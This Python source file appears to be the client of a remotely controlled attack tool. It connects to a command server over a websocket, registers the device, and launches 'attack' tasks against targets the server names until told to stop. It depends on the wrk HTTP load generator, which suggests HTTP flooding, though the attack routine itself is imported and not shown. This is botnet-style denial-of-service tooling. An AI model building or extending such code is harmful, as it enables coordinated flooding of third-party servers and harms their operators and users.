import logging
import sys
import asyncio

from asyncio import Queue
from websockets.exceptions import ConnectionClosed
from sanic.server.websockets.impl import WebsocketImplProtocol

from lib.utils import wait_for
from scripts.services.communication_services import wait_for_actions_from_server, dispatch_action, is_needed_to_stop
from scripts.services.connect_services import connect, register
from scripts.exceptions import CannotGetActionFromServerException


logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='{%(filename)s:%(lineno)d} %(levelname)s - %(message)s')
logger = logging.getLogger(__package__)


async def try_finish_attack_task(attack_task: asyncio.Task, actions_queue: Queue):
    """Waits until <attack_task> is finished or server communicates to stop"""
    while True:
        new_action = await wait_for(actions_queue.get(), 0.1)

        if new_action is not None and await is_needed_to_stop(new_action):
            logger.info(f"server communicated to stop attack on {new_action.target}")
            attack_task.cancel()
            return

        if attack_task.done():
            logger.info(f"attack stopped")
            return


async def handle_actions_from_server(websocket: WebsocketImplProtocol, actions_queue: Queue):
    while True:
        action = await actions_queue.get()
        logger.info(f"Starting attack on: {action.target}")

        attack_task = asyncio.create_task(dispatch_action(action))
        await try_finish_attack_task(attack_task, actions_queue)


async def start(addr: str):
    websocket = await connect(addr)
    if websocket is None:
        logger.fatal("Connection refused during connecting to the server")
        return -1
    logger.info(f"Connected to host server: {addr}")

    registration = await register(websocket)
    if registration is None:
        logger.fatal("Error trying to register this device on server")
        return -2
    logger.info(f"Registered on host server: {addr}")

    actions = Queue()

    try:
        actions_getter_task = asyncio.create_task(wait_for_actions_from_server(websocket, actions))
        actions_handler_task = asyncio.create_task(handle_actions_from_server(websocket, actions))
        await asyncio.gather(*[actions_getter_task, actions_handler_task])

    except ConnectionClosed as e:
        logger.error(f"Connection was closed: {e}")
    except CannotGetActionFromServerException as e:
        logger.error(f"Cannot get action from server: {e}")

    finally:
        await websocket.close()


if __name__ == "__main__":
    from shutil import which

    if which("wrk") is None:
        print("wrk is not installed")
        print("To install wrk, use 'sudo apt-get install wrk if you are running on ubuntu, or install"
              "wrk from source https://github.com/wg/wrk")
        exit(-1)

    if len(sys.argv) < 2:
        print("Server address not specified\nUsage:\tpython3 connect.py <server_address>")
        exit(-1)

    asyncio.run(start(sys.argv[1]))
